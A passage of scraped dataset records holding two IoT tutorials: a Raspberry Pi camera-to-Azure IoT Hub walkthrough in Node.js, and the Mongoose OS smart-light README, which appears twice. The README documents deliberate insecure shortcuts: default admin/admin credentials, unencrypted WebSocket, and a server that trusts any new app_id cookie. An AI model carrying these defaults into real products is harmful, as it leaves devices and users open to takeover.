connecttoiothub();\nled.stop().off();\nlog('ready');\nbutton.on('press', async () => {\nled.blink(500);\nlog('taking a picture...');\nawait takepicture('picture.png');\nlog(`analyzing image...`);\nlet tags = await analyzeimage('picture.png');\nawait deleteimage('picture.png');\nlog('sending message to iot hub...');\nawait sendmessage(hubclient, json.stringify(tags));\nlog(`sent ${json.stringify(tags)} to your iot hub`);\nled.stop().off();\nlog('ready');\n})\n}\nfunction readyboard() {\nreturn new promise((resolve, reject) => {\nlet five = require('johnny-five');\nlet raspi = require('raspi-io');\nlet board = new five.board({ io: new raspi() });\nboard.on('ready', () => {\nresolve(five);\n});\n});\n}\nfunction connecttoiothub() {\nreturn new promise((resolve, reject) => {\nlet deviceamqp = require('azure-iot-device-amqp');\nlet connectionstring = process.env.device_conn_string;\nlet client = deviceamqp.clientfromconnectionstring(connectionstring);\nclient.open(err => {\nif (err) reject(err);\nresolve(client);\n});\n})\n}\nfunction takepicture() {\nreturn new promise((resolve, reject) => {\nlet camera = require('camerapi');\nlet cam = new camera();\ncam.basefolder('.');\ncam.takepicture('picture.png', (file, error) => {\nif (error) reject(error);\nresolve(file);\n});\n});\n}\nfunction analyzeimage(image) {\nlet oxford = require('project-oxford');\nlet cogclient = new oxford.client(process.env.cognitive_services_key);\nreturn cogclient.vision.analyzeimage({ path: image, tags: true })\n.then(result => result.tags);\n}\nfunction deleteimage(image) {\nreturn new promise((resolve, reject) => {\nlet fs = require('fs');\nfs.unlink(image, (err) => {\nif (err) reject(err);\nresolve();\n});\n});\n}\nfunction sendmessage(client, content) {\nreturn new promise((resolve, reject) => {\nlet device = require('azure-iot-device');\nlet message = new device.message(content);\nclient.sendevent(message, (err, res) => {\nif (err) reject(err);\nresolve(res);\n});\n});\n}\nfunction log(msg) {\nconsole.log(msg);\n}\nadding package dependencies\nthroughout this code, there are a number of dependencies that are used. they all use the require('<packagename>') syntax.\nsome of these dependencies can be installed on the host machine, but not all of them. the raspi-io and camerapi packages are expecting to be on an actual device and will fail otherwise.\nso, let's just add the dependencies directly to the package.json file. that way, when we deploy our code to the device and run npm install it will install them on the device.\nto do this, simply paste the following into your package.json file...\n\"dependencies\": {\n\"@types/johnny-five\": \"0.0.29\",\n\"@types/node\": \"^6.0.45\",\n\"@types/project-oxford\": \"^0.1.29\",\n\"azure-iot-device\": \"^1.0.15\",\n\"azure-iot-device-amqp\": \"^1.0.15\",\n\"camerapi\": \"^0.1.0\",\n\"johnny-five\": \"^0.10.3\",\n\"project-oxford\": \"^1.5.0\",\n\"raspi-io\": \"^6.1.0\"\n},\ntip in vs code, you can hit ctrl+space when your cursor is on the version and it will autocomplete the most current version. you can even autocomplete the package names!\njust to be clear on why we did this. when we deploy our app out to the device, we'll send this package.json file along as well. it contains information about all of the dependencies needed by the project, and makes it easy to install all dependencies at once.\nasynchronous steps\nyou'll notice that this code uses the async/await pattern to call a number of functions and orchestrate the results rather elegantly. the async/await pattern works with existing javascript promises, so you'll notice that each of the functions returns a promise and gives us a chance to determine when that promise resolves.\nstep 1. readying the board\nfirst, we have to get on speaking terms with the gpio pins on our raspberry pi.\nevery iot device implements its io pins differently, but in most cases there are libraries already mapped to the language you want to code in. for the raspberry pi, check out my article to see specifically how it works.\nwhat we want is a high level library that takes away all of the ceremony for us and lets us be expressive about what we're trying to do. that's where johnny five comes in.\njohnny five is a javascript library for working with devices. it is very popular and supports a ton of devices and hardware sensors. furthermore, any code you write in johnny five is easy to port to another device type.\nlook at readyboard function in index.js and notice that we resolve the promise as soon as johnny five reports that everything has been setup correctly.\nstep 2. connecting to our iot hub\nnow, have a look at the connecttoiothub function, and note that this function call won't happen until after the board is ready. that's the beauty of await.\nto connect to the iot hub, we need the azure-iot-device and azure-iot-device-amqp packages that we installed.\nazure-iot-device is a generic module for azure iot device code, and the second is specific to whatever iot protocol we choose. we're choosing to use amqp here.\nthen, we drop our connection string in. note that this is not the \"iot hub\" connection string. this is the \"device connection string\".\nyou can get this by using the iot hub explorer utility again. just do...\niothub-explorer list --connection-string\nthen we use that connection string we added to our .profile to create our iot hub client. here's the line i'm referring to...\nlet hubclient = deviceamqp.clientfromconnectionstring(process.env.device_conn_string);\nin node.js, environment variables are available under process.env.\nif the connection doesn't open, the promise will be rejected and a top level exception will be thrown. that's exactly the behavior we want.\nstep 3. taking a picture\nnow, take a look at the takepicture function.\nif you're on the command line of the raspberry pi, you use the raspicam utility to take a photo or video. we, however, are not on the command line - we're in node.js. in that case, you use a module to wrap that call to raspicam. the module i chose is called camerapi.\nto take a picture, we instantiate a new camera, set its base folder (where pictures are saved) to the current directory, and then take a picture. here's the code...\nlet cam = new camera();\ncam.basefolder('.');\ncam.takepicture('picture.png', (file,error) => {\n...\n});\nthat was pretty easy. when the program is run, after the board is ready and after a connection to the iot hub is established, that code will be executed and a single picture will be taken and saved as picture.png in the same directory where our code is.\nnow let's send that image to microsoft cognitive services to see what's in it.\nstep 4. analyzing the image with cognitive services\nnow, take a look at the analyzeimage function.\n\"project oxford\" was the code name for microsoft cognitive services, and the project-oxford module is a node.js sdk for accessing it.\nnow it's time to use that cognitive services key we set as an environment variable earlier. it should be available at process.env.cognitive_services_key.\nnow to actually use the service to analyze an image. here's the code...\nreturn cogclient.vision.analyzeimage({ path: image, tags: true })\n.then(result => result.tags);\nthat calls the analyzeimage() method passing it the name of the picture that we just took. we also tell the api that we're interested in the tags by adding tags: true.\ninstead of using a callback, this sdk uses promises (nice!), so the function we pass to the .then() method is what happens after the response comes back from the service. since we're wanting to return a promise too, we can simply return the results of the analyzeimage() call.\nhere we're taking the result as is, but there's a good chance you would want to do some conditioning on that object here. we also delete the picture so we're ready for the next one.\nnext we need to get that result up to an iot hub so we can do all kinds of cloud magic to it.\nstep 5. sending the results to iot hub\nand finally, we want to send a message to the iot hub every time an image is successfully analyzed. have a look at the sendmessage function.\nlet device = require('azure-iot-device');\nlet message = new device.message(content);\nclient.sendevent(message, (err, res) => {\nif (err) reject(err);\nresolve(res);\n});\nthis will create an iot hub message using the content we pass in, send it, and handle some error cases for us. if there are no errors then it will give us a little message on the console.\nthat brings us to code completion! you can check out the file directly if that helps. now we just need to get your beautiful code down to your raspberry pi!\ndeploying to the device\nthere are many ways to deploy application code to an iot device, but there's nothing quite as raw as simply copying the files directly over the network.\nfor this we need scp.\nthere are a number of files in our project now, but there are really only two that we need on our device: index.js and package.json. the package.json file is important, because it contains the list of dependencies our project has that we'll need to restore.\nfirst, let's create a folder on the device to hold our project files. at your command line in your code folder, run this statement (you'll need your password)...\nssh <username>@<device name>.local 'mkdir device'\ncalling ssh with the username@host as well as a command (i.e. 'mkdir device') issues that command on the remote device. it's a pretty handy way to fire off a command on a remote machine without the trouble of connecting, commanding, and then disconnecting.\nnow run this one to copy these two files to the device...\nscp index.js package.json <username>@<device name>.local:~/device\nthe files are out there and ready to run. i think the easiest way to run them is to open a second console window and ssh in directly to the device. use...\nssh <username>@<device name>.local\nnote that this command is just the ssh and the username@host so it doesn't fire a command, but rather just starts a remote session.\nafter your first code deployment, you'll need to restore dependencies. you can do that (once you're ssh'ed to the device) by using...\nnpm install\nnow it's time to go get some coffee, because that command is going to take considerable time. there's a lot going on in the raspi-io library.\nand now (still ssh'ed to the device) you can run your application. normally, you run a node application using something like node ., but on a raspberry pi, it's a bit tricky. you see, your code is not allowed to access the gpio pins unless you use sudo. but then if you use environment variables, using sudo doesn't respect them. additionally, if you used nvs to install node like i suggested, then sudo node doesn't work because it doesn't see the node command. to resolve all of this at once, just execute...\nsudo -e $(which node) .\nthe -e instructs sudo to keep your environment variables. $(which node) finds the exact location of the node command and sends that. finally, . means \"this folder\". node is smart enough to look for an index.js file in the current folder and run that.\nif all went as planned, your code shoudl be running, and you should se \"ready\". to test it, push the button and see what happens!\none more note here. i hooked some timing up to this code and discovered that it takes a full 6s to take the picture. i'm not sure why it takes that long. the entire process takes close to 10s on my machine, where the vast majority of the rest of the time is spent sending the image to the cloud and analyzing it. sending a message to iot hub takes very little time. the message is small and the amqp protocol is a very efficient one.\nthat's great and all, but perhaps we want to see what messages are landing in our hub. for that we would write a simple service to monitor hub messages. we can write and run this service on our host machine. it doesn't have to be running in azure or on the device.\nwriting the hub listener code\nwe'll write one more node project, connect it to our iot hub, and simply report to the console whenever we see messages appear in the hub.\nthe only real reason for this part is to show you how you would write a custom service that responds to messages as they arrive in the cloud. actually, there's a decent chance you won't even need a custom service since you can wire up iot hub to a number of other azure services with configuration alone. but just in case.\nfollow these steps on your host machine...\nin the iot-workshop folder that you created earlier, create another folder called hublistener.\nin that hublistener folder on your command line run npm init -y. that creates the package.json file.\nrun npm install azure-event-hubs --save\ncreate an index.js file\nnow edit that index.js file (to open the project in code, just type code .)\nhere are the file contents...\n//index.js\nlet eh = require('azure-event-hubs');\nvar hubclient = eh.client.fromconnectionstring(process.env.hub_connection_string);\nhubclient.open()\n.then(hubclient.getpartitionids.bind(hubclient))\n.then(pids =>\npids.map(pid =>\nhubclient.createreceiver('$default', pid, { 'startaftertime': date.now() })\n.then(receiver => {\nconsole.log('created partition receiver: ' + pid)\nreceiver.on('errorreceived', err => console.log(err.message));\nreceiver.on('message', m => console.log(json.stringify(m.body)));\n})\n)\n)\n.catch(err => console.log(err.message));\nthat first line imports the azure-event-hubs package. i haven't mentioned this yet, but iot hub is implemented with an azure event hub, and every iot hub has an event hub endpoint. that means that an iot hub can act like an event hub. we're using the azure-event-hub package here because we only want to read from hub and are not actually going to be sending any cloud-to-device (c2d) messages.\nwe start with the connection string. this is the iot hub connection string (as opposed to the device connection string), and we discover by navigating to our iot hub in our azure portal and looking at the \"shared access policies\" section. we'll choose the service policy, and then copy the primary connection string.\nonce we've created the hubclient we call open() and then (this uses the promise pattern) we get the partition ids (we may have configured our hub to use any number of partitions between 2 and 32 or even more), and then we create a receiver for each partition, and then we tie up some event handlers for that receiver including what to do when it sees a message. in that case, we simply log it to the console.\nwe can run this (on our host machine) using node . at the command line in the hublistener folder. you'll see the messages that it's connecting and creating partition receivers, and then if you go send a message from your device, you should see it in the hublistener. very cool!\nwe're successfully sending messages to the cloud, but now what? we're slowly collecting data about everything a camera sees, and now we would likely want to do something in the cloud with that data. maybe we want to report it with some graphs. maybe we want to create an alert for any time a certain thing is spotted. maybe we want to send an email whenever the incident count of a certain object is seen a certain number of times.\noh, the possibilities are endless!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000835, "year": null}, {"Unnamed: 0": 842, "autor": 842, "date": null, "content": "Full IoT product: smart light on Mongoose OS\nThis repository contains the implementation of the full, functional commercial IoT product under a commercial-friendly Apache 2.0 license. It utilises the power of Mongoose OS and can be used as a reference for creating similar smart products.\nThis project implements a smart light. For the hardware, we use a development board with an LED, which serves as a light. The devboard can be \"shipped\" to a customer. A customer provisions it using a mobile app. You, as a vendor, have full control over all \"shipped\" products, including device dashboard with remote firmware updates, remote management and usage statistics.\nThis short video demonstrates the use case:\nStep-by-step usage guide\nGet a hardware device. We simulate a real smart lite with one of the supported development boards - choose one from https://mongoose-os.com/docs/quickstart/devboards.md. The built-in LED on the devboard will act as a light. Alternatively, you can put together your own hardware setup, just make sure to alter firmware/mos.yml to set the GPIO pin number for the LED.\nFollow https://mongoose-os.com/software.html to install mos, a Mongoose OS command-line tool.\nClone this repository:\ngit clone https://github.com/cesanta/mongoose-os-smart-light\nInstall Docker Compose and start the backend on your workstation (or any other machine):\ncd backend\ndocker-compose build\ndocker-compose up\nNOTE: on MacOS, make sure to use Docker for Mac (not Docker toolbox), see https://docs.docker.com/docker-for-mac/docker-toolbox/. That is required cause Docker toolbox installation on Mac requires extra steps to forward opened ports.\nConnect your device to your workstation via a USB cable. Build and flash the device:\ncd mongoose-os-smart-light/firmware\nmos build --platform YOUR_PLATFORM --local --verbose # esp32, cc3220, stm32, esp8266\nmos flash\nRegister a new device on a management dashboard, obtain ID and TOKEN:\n$ curl -d '{}' -u admin:admin http://YOUR_WORKSTATION_IP:8009/api/v2/devices\n{\n...\n\"id\": \"...........\",\n\"token\": \"..........\",\n...\n}\nIf you login to the dash at http://YOUR_WORKSTATION_IP:8009 with username/password admin/admin, you should be able to see your new device.\nFactory-configure your device, and pre-provision it on a dashboard:\nmos config-set --no-reboot device.id=ID\nmos config-set --no-reboot dash.token=TOKEN\nmos config-set --no-reboot dash.server=ws://YOUR_WORKSTATION_IP:8009/api/v2/rpc\nmos config-set --no-reboot conf_acl=wifi.*,device.*,dash.enable\nmos call FS.Rename '{\"src\": \"conf9.json\", \"dst\": \"conf5.json\"}'\nmos call Sys.Reboot\nThe mos config-set commands generates conf9.json file on a device. The mos call FS.Rename renames it to conf5.json, in order to make this configuration immune to factory reset and OTA. The only way to re-configure these settings is to reflash the device, or remove conf5.json.\n\"Ship\" a device to a \"customer\". Start a browser on your mobile app, open http://YOUR_WORKSTATION_IP:8008. Press on the \"Add device\" button, and follow provisioning instructions.\nWhen a newly provisioned device appears on the list, switch it on/off.\nIn order to re-provision, press on the \"user button\" and hold it for more than 3 seconds. That will reset the device to factory defaults. The reset functionality is provided by the provision Mongoose OS library.\nGeneral Architecture\nThe backend is installed on your workstation (so called on-premises installation). It is completely self-contained, not requiring any external service to run, and run as a collection of Docker images (docker-compose). Thus, such backend could be run on any server, e.g. as a AWS EC2 instance, Google Cloud instance, etc.\nDevice management backend is mDash (the same that runs on https://dash.mongoose-os.com), the frontend is a PWA (progressive web app). Both are behind Nginx, which terminates SSL from devices and mobile apps. For the sake of simplicity, the SSL certificate management is avoided, and this reference plain WebSocket communication rather than WSS. For the production, SSL should be turned on.\nThe mobile app talks with the API server over WebSocket, sending and receiving JSON events. Switching the light on/off sends {\"name:\"on\", \"data\":{\"id\":.., \"on\": true/false}} event. An API server catches it, and talks to mDash to modify the \"desired\" device shadow state for the device with corresponding ID, {\"desired\": {\"on\": true/false}}. The device shadow generates a delta, which is sent to a device. A device code reacts to the delta, switches the light on or off, and updates the shadow, setting the \"reported\" state: {\"reported\": {\"on\": true/false}}. Shadow update clears the delta, and triggers a notification from mDash. API server catches the notification, and forwards it to the mobile app. A mobile app reacts, refreshes device list, and sets the on/off GUI control according to the device shadow.\nThat implements a canonic pattern for using a device shadow - the same logic can be used with backends like AWS IoT device shadow, Microsoft Azure device twin, etc. Note how device shadow changes when user switches the lights on/off. Also note that if the device comes online, it synchronises with the shadow, switching on/off according to the desired.on setting.\nBackend\nThe mDash comes pre-configured with a single administrator user admin (password admin). That was done with the following command:\ndocker-compose run dash /dash --config-file /data/dash_config.json --register-user admin admin\nThe resulting backend/data/db.json mDash database was committed to the repo. The API key, automatically created for the admin user, is used by the API Server for all API Server <-> mDash communication, and specified as the --token flag in the backend/docker-compose.yml file. Thus, the API Server talks to the mDash with the administrative privileges.\nDevice provisioning process\nAdding new device is implemented by the Mobile app (PWA) in 3 steps:\nCustomer is asked to join the WiFi network called Mongoose-OS-Smart-Light and set device name. A new device, when shipped to the customer, starts a WiFi access point, and has a pre-defined IP address 192.168.4.1. The app calls device's RPC function Config.Set, saving entered device name into the device.password configuration variable.\nCustomer is asked to enter WiFi name/password. The app calls device's RPC function Config.Set to set wifi.sta.{ssid,pass,enable} configuration variables, and then calls Config.Save function to save the config and reboot the device. After the reboot, a device joins home WiFi network, and starts the DNS-SD service, making itself visible as mongoose-os-smart-light.local.\nCustomer is asked to join home WiFi network and press the button to finish registration process. The app calls Config.Set and Config.Save RPCs to disable local webserver on a device, and the DNS-SD service. Then it sends pair Websocket message to the API server, asking to associate the device with the particular mobile APP (via the generated app ID). The API server registers the app ID as a user on mDash, and sets the shared_with device attribute equal to the app ID.\nThus, all devices are owned by the admin user, but the pairing process shares a device with the particular mobile app. Therefore, when an API server lists devices on behalf of the mobile app, all shared devices are returned back.\nMongoose OS - based firmware\nThe firmware source code lives in firmware/. This is a simple Mongoose OS application, that contains a firmware/mos.yml build file and firmware/src/main.c source file.\nThe bulk of the firmware functionality is provided by the Mongoose OS libraries, listed in the mos.yml file:\nlibs:\n- origin: https://github.com/mongoose-os-libs/ca-bundle\n- origin: https://github.com/mongoose-os-libs/core\n- origin: https://github.com/mongoose-os-libs/dash\n- origin: https://github.com/mongoose-os-libs/dns-sd\n- origin: https://github.com/mongoose-os-libs/http-server\n- origin: https://github.com/mongoose-os-libs/provision\n- origin: https://github.com/mongoose-os-libs/rpc-service-config\n- origin: https://github.com/mongoose-os-libs/rpc-service-fs\n- origin: https://github.com/mongoose-os-libs/rpc-service-ota\n- origin: https://github.com/mongoose-os-libs/rpc-service-wifi\n- origin: https://github.com/mongoose-os-libs/rpc-uart\n- origin: https://github.com/mongoose-os-libs/ota-http-server\n- origin: https://github.com/mongoose-os-libs/ota-shadow\n- origin: https://github.com/mongoose-os-libs/wifi\nAlso, mos.yml file defines custom configuration parameters: the GPIO pin number for the light LED, and a boolean setting whether that GPIO pin is inverted or not:\n- [\"smartlight\", \"o\", {title: \"My app custom settings\"}]\n- [\"smartlight.pin\", \"i\", 2, {title: \"Light GPIO pin\"}]\n- [\"smartlight.inverted\", \"b\", true, {title: \"True for ESP32 & ESP8266\"}]\nThe main.c file contains a canonical device shadow logic. It reports lights state when connected to the shadow, and reacts on the shadow delta. The whole source code is only one page long. It is pretty descriptive and easily understood.\nThe mgos_app_init() function sets up shadow handlers:\nenum mgos_app_init_result mgos_app_init(void) {\nmgos_event_add_handler(MGOS_SHADOW_UPDATE_DELTA, delta_cb, NULL);\nmgos_event_add_handler(MGOS_SHADOW_CONNECTED, connected_cb, NULL);\nreturn MGOS_APP_INIT_SUCCESS;\n}\nThe connected_cb() handler reports current state to the backend. The delta_cb() catches new delta, applies it, and reports the new state.\nMobile app\nThe mobile app is a Progressive Web App (PWA). It is written in preact and bootstrap. The main app logic is in a signle source file, backend/mobile-app/js/app.jsx In order to avoid a separate build step, the app uses a prebuilt babel transpiler.\nWhen first downloaded and run on a mobile phone or desktop browser, an app generates a unique ID and sets an app_id cookie. The app_id cookie is used to authenticate the mobile phone with the API server. The API server creates a user on the mDash for that app_id. Basically, an API server trusts each new connection with a new app_id that it is a new mobile app client, and creates a user for it. This simple authentication schema allows to avoid user login/password step, but is also suboptimal, cause it binds a user to a specific device. If, for some reason, cookies get cleared, then all devices must be re-paired.\nThat was done deliberately to skip the user login step, as it is not crucial for this reference implementation. Those who want to implement password based user auth, can easily do so, for it is well known and understood.\nWhen started, the app creates a WebSocket connection to the API Server, and all communication is performed as an exchange of WebSocket messages. Each message is an \"event\", which is a single JSON object with two attributes: name and data. The API Server receives events, and may send events in return. There is no request/response pattern, however. The communication is \"fire and forget\" events.\nThe events sent by the app are:\n{\"name\": \"list\"} - request to send device list\n{\"name\": \"pair\", \"data\":{\"id\":...}} - request to pair a device with the app\nThe events sent by the API Server are:\n{\"name\": \"list\", \"data\": [...]} - list of devices, exactly as returned by mDash - see mDash API. The device object contains device shadow. The GUI toggle button is set according to the device.shadow.reported.on property.\n{\"name\": \"pair\", \"data\": {\"id\": ...}} - sent when a device with a given ID was paired. Pairing means setting device.shared_with device property on mDash.\nAll notifications that are sent by mDash to the API Server are forwarded by the API Server to the mobile app for the paired devices. Specifically, the online, offline, and rpc.out.Dash.Shadow.Update notifications trigger device list refresh on the mobile app.\nAPI Server\nThe API Server is a simple NodeJS application. All code is in backend/api-server/main.js. The API Server opens a permanent WebSocket connection to mDash to catch all notifications (see mDash notifications). To respond to the mobile app events, the API Server calls mDash via the RESTful API.\nmDash management dashboard\nmDash is an IoT backend with device management, desinged specifically for Mongoose OS - built devices. It is extensively documented at https://mongoose-os.com/docs/userguide/dashboard.md.\nmDash is distributed by Cesanta as a standalone docker image that could be run on-premises, as well as a hosted service https://dash.mongoose-os.com. For this reference product, mDash is running standalone.\nmDash's job is to terminate all device communication, provide notifications and management capabilities - like OTA updates, etc.\nmDash can be run anywhere: docker run mgos/dash. By default, it has a restriction on the maximum number of users (5 maximum). In order to remove the restriction for the production usage, contact us for a production license.\nUsage statistics and analytics\nThe API Server receives notifications for all devices from the mDash. They get stored in a plain text file, backend/data/notification.log, which can be used for the further analytics. Multiple options are available, for example uploading that data to the one of the well-known analytics engines, provided by Google Cloud, Amazon AWS, Microsoft Azure, etc.\nSince the particular analytics solution depends on the product, we leave it there.\nContact\nPlease contact us if you would like our team to customise this reference for your product. That includes customisation of the firmware, backend and mobile app.", "link": "https://github.com/cesanta/mongoose-os-smart-light", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "full iot product: smart light on mongoose os\nthis repository contains the implementation of the full, functional commercial iot product under a commercial-friendly apache 2.0 license. it utilises the power of mongoose os and can be used as a reference for creating similar smart products.\nthis project implements a smart light. for the hardware, we use a development board with an led, which serves as a light. the devboard can be \"shipped\" to a customer. a customer provisions it using a mobile app. you, as a vendor, have full control over all \"shipped\" products, including device dashboard with remote firmware updates, remote management and usage statistics.\nthis short video demonstrates the use case:\nstep-by-step usage guide\nget a hardware device. we simulate a real smart lite with one of the supported development boards - choose one from https://mongoose-os.com/docs/quickstart/devboards.md. the built-in led on the devboard will act as a light. alternatively, you can put together your own hardware setup, just make sure to alter firmware/mos.yml to set the gpio pin number for the led.\nfollow https://mongoose-os.com/software.html to install mos, a mongoose os command-line -----> tool !!! .\nclone this repository:\ngit clone https://github.com/cesanta/mongoose-os-smart-light\ninstall docker compose and start the backend on your workstation (or any other machine):\ncd backend\ndocker-compose build\ndocker-compose up\nnote: on macos, make sure to use docker for mac (not docker toolbox), see https://docs.docker.com/docker-for-mac/docker-toolbox/. that is required cause docker toolbox installation on mac requires extra steps to forward opened ports.\nconnect your device to your workstation via a usb cable. build and flash the device:\ncd mongoose-os-smart-light/firmware\nmos build --platform your_platform --local --verbose # esp32, cc3220, stm32, esp8266\nmos flash\nregister a new device on a management dashboard, obtain id and token:\n$ curl -d '{}' -u admin:admin http://your_workstation_ip:8009/api/v2/devices\n{\n...\n\"id\": \"...........\",\n\"token\": \"..........\",\n...\n}\nif you login to the dash at http://your_workstation_ip:8009 with username/password admin/admin, you should be able to see your new device.\nfactory-configure your device, and pre-provision it on a dashboard:\nmos config-set --no-reboot device.id=id\nmos config-set --no-reboot dash.token=token\nmos config-set --no-reboot dash.server=ws://your_workstation_ip:8009/api/v2/rpc\nmos config-set --no-reboot conf_acl=wifi.*,device.*,dash.enable\nmos call fs.rename '{\"src\": \"conf9.json\", \"dst\": \"conf5.json\"}'\nmos call sys.reboot\nthe mos config-set commands generates conf9.json file on a device. the mos call fs.rename renames it to conf5.json, in order to make this configuration immune to factory reset and ota. the only way to re-configure these settings is to reflash the device, or remove conf5.json.\n\"ship\" a device to a \"customer\". start a browser on your mobile app, open http://your_workstation_ip:8008. press on the \"add device\" button, and follow provisioning instructions.\nwhen a newly provisioned device appears on the list, switch it on/off.\nin order to re-provision, press on the \"user button\" and hold it for more than 3 seconds. that will reset the device to factory defaults. the reset functionality is provided by the provision mongoose os library.\ngeneral architecture\nthe backend is installed on your workstation (so called on-premises installation). it is completely self-contained, not requiring any external service to run, and run as a collection of docker images (docker-compose). thus, such backend could be run on any server, e.g. as a aws ec2 instance, google cloud instance, etc.\ndevice management backend is mdash (the same that runs on https://dash.mongoose-os.com), the frontend is a pwa (progressive web app). both are behind nginx, which terminates ssl from devices and mobile apps. for the sake of simplicity, the ssl certificate management is avoided, and this reference plain websocket communication rather than wss. for the production, ssl should be turned on.\nthe mobile app talks with the api server over websocket, sending and receiving json events. switching the light on/off sends {\"name:\"on\", \"data\":{\"id\":.., \"on\": true/false}} event. an api server catches it, and talks to mdash to modify the \"desired\" device shadow state for the device with corresponding id, {\"desired\": {\"on\": true/false}}. the device shadow generates a delta, which is sent to a device. a device code reacts to the delta, switches the light on or off, and updates the shadow, setting the \"reported\" state: {\"reported\": {\"on\": true/false}}. shadow update clears the delta, and triggers a notification from mdash. api server catches the notification, and forwards it to the mobile app. a mobile app reacts, refreshes device list, and sets the on/off gui control according to the device shadow.\nthat implements a canonic pattern for using a device shadow - the same logic can be used with backends like aws iot device shadow, microsoft azure device twin, etc. note how device shadow changes when user switches the lights on/off. also note that if the device comes online, it synchronises with the shadow, switching on/off according to the desired.on setting.\nbackend\nthe mdash comes pre-configured with a single administrator user admin (password admin). that was done with the following command:\ndocker-compose run dash /dash --config-file /data/dash_config.json --register-user admin admin\nthe resulting backend/data/db.json mdash database was committed to the repo. the api key, automatically created for the admin user, is used by the api server for all api server <-> mdash communication, and specified as the --token flag in the backend/docker-compose.yml file. thus, the api server talks to the mdash with the administrative privileges.\ndevice provisioning process\nadding new device is implemented by the mobile app (pwa) in 3 steps:\ncustomer is asked to join the wifi network called mongoose-os-smart-light and set device name. a new device, when shipped to the customer, starts a wifi access point, and has a pre-defined ip address 192.168.4.1. the app calls device's rpc function config.set, saving entered device name into the device.password configuration variable.\ncustomer is asked to enter wifi name/password. the app calls device's rpc function config.set to set wifi.sta.{ssid,pass,enable} configuration variables, and then calls config.save function to save the config and reboot the device. after the reboot, a device joins home wifi network, and starts the dns-sd service, making itself visible as mongoose-os-smart-light.local.\ncustomer is asked to join home wifi network and press the button to finish registration process. the app calls config.set and config.save rpcs to disable local webserver on a device, and the dns-sd service. then it sends pair websocket message to the api server, asking to associate the device with the particular mobile app (via the generated app id). the api server registers the app id as a user on mdash, and sets the shared_with device attribute equal to the app id.\nthus, all devices are owned by the admin user, but the pairing process shares a device with the particular mobile app. therefore, when an api server lists devices on behalf of the mobile app, all shared devices are returned back.\nmongoose os - based firmware\nthe firmware source code lives in firmware/. this is a simple mongoose os application, that contains a firmware/mos.yml build file and firmware/src/main.c source file.\nthe bulk of the firmware functionality is provided by the mongoose os libraries, listed in the mos.yml file:\nlibs:\n- origin: https://github.com/mongoose-os-libs/ca-bundle\n- origin: https://github.com/mongoose-os-libs/core\n- origin: https://github.com/mongoose-os-libs/dash\n- origin: https://github.com/mongoose-os-libs/dns-sd\n- origin: https://github.com/mongoose-os-libs/http-server\n- origin: https://github.com/mongoose-os-libs/provision\n- origin: https://github.com/mongoose-os-libs/rpc-service-config\n- origin: https://github.com/mongoose-os-libs/rpc-service-fs\n- origin: https://github.com/mongoose-os-libs/rpc-service-ota\n- origin: https://github.com/mongoose-os-libs/rpc-service-wifi\n- origin: https://github.com/mongoose-os-libs/rpc-uart\n- origin: https://github.com/mongoose-os-libs/ota-http-server\n- origin: https://github.com/mongoose-os-libs/ota-shadow\n- origin: https://github.com/mongoose-os-libs/wifi\nalso, mos.yml file defines custom configuration parameters: the gpio pin number for the light led, and a boolean setting whether that gpio pin is inverted or not:\n- [\"smartlight\", \"o\", {title: \"my app custom settings\"}]\n- [\"smartlight.pin\", \"i\", 2, {title: \"light gpio pin\"}]\n- [\"smartlight.inverted\", \"b\", true, {title: \"true for esp32 & esp8266\"}]\nthe main.c file contains a canonical device shadow logic. it reports lights state when connected to the shadow, and reacts on the shadow delta. the whole source code is only one page long. it is pretty descriptive and easily understood.\nthe mgos_app_init() function sets up shadow handlers:\nenum mgos_app_init_result mgos_app_init(void) {\nmgos_event_add_handler(mgos_shadow_update_delta, delta_cb, null);\nmgos_event_add_handler(mgos_shadow_connected, connected_cb, null);\nreturn mgos_app_init_success;\n}\nthe connected_cb() handler reports current state to the backend. the delta_cb() catches new delta, applies it, and reports the new state.\nmobile app\nthe mobile app is a progressive web app (pwa). it is written in preact and bootstrap. the main app logic is in a signle source file, backend/mobile-app/js/app.jsx in order to avoid a separate build step, the app uses a prebuilt babel transpiler.\nwhen first downloaded and run on a mobile phone or desktop browser, an app generates a unique id and sets an app_id cookie. the app_id cookie is used to authenticate the mobile phone with the api server. the api server creates a user on the mdash for that app_id. basically, an api server trusts each new connection with a new app_id that it is a new mobile app client, and creates a user for it. this simple authentication schema allows to avoid user login/password step, but is also suboptimal, cause it binds a user to a specific device. if, for some reason, cookies get cleared, then all devices must be re-paired.\nthat was done deliberately to skip the user login step, as it is not crucial for this reference implementation. those who want to implement password based user auth, can easily do so, for it is well known and understood.\nwhen started, the app creates a websocket connection to the api server, and all communication is performed as an exchange of websocket messages. each message is an \"event\", which is a single json object with two attributes: name and data. the api server receives events, and may send events in return. there is no request/response pattern, however. the communication is \"fire and forget\" events.\nthe events sent by the app are:\n{\"name\": \"list\"} - request to send device list\n{\"name\": \"pair\", \"data\":{\"id\":...}} - request to pair a device with the app\nthe events sent by the api server are:\n{\"name\": \"list\", \"data\": [...]} - list of devices, exactly as returned by mdash - see mdash api. the device object contains device shadow. the gui toggle button is set according to the device.shadow.reported.on property.\n{\"name\": \"pair\", \"data\": {\"id\": ...}} - sent when a device with a given id was paired. pairing means setting device.shared_with device property on mdash.\nall notifications that are sent by mdash to the api server are forwarded by the api server to the mobile app for the paired devices. specifically, the online, offline, and rpc.out.dash.shadow.update notifications trigger device list refresh on the mobile app.\napi server\nthe api server is a simple nodejs application. all code is in backend/api-server/main.js. the api server opens a permanent websocket connection to mdash to catch all notifications (see mdash notifications). to respond to the mobile app events, the api server calls mdash via the restful api.\nmdash management dashboard\nmdash is an iot backend with device management, desinged specifically for mongoose os - built devices. it is extensively documented at https://mongoose-os.com/docs/userguide/dashboard.md.\nmdash is distributed by cesanta as a standalone docker image that could be run on-premises, as well as a hosted service https://dash.mongoose-os.com. for this reference product, mdash is running standalone.\nmdash's job is to terminate all device communication, provide notifications and management capabilities - like ota updates, etc.\nmdash can be run anywhere: docker run mgos/dash. by default, it has a restriction on the maximum number of users (5 maximum). in order to remove the restriction for the production usage, contact us for a production license.\nusage statistics and analytics\nthe api server receives notifications for all devices from the mdash. they get stored in a plain text file, backend/data/notification.log, which can be used for the further analytics. multiple options are available, for example uploading that data to the one of the well-known analytics engines, provided by google cloud, amazon aws, microsoft azure, etc.\nsince the particular analytics solution depends 